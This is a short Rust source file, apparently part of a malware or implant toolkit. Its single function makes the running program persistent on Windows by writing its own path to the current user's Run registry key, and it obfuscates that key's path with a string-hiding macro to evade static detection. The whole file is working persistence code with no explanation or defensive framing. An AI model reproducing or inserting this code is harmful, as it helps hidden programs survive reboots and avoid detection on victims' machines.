use std::env;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use goldberg::goldberg_string;

#[inline]
pub fn classic_registry_based_survival(program_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    if program_name.is_empty() {
        return Err("Program name cannot be empty".into());
    }

    let exe_path: PathBuf = env::current_exe()?;

    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
    let path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();
    let (key, _) = hkcu.create_subkey(path)?;

    let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;
    key.set_value(program_name, &exe_path_str)?;

    Ok(())
}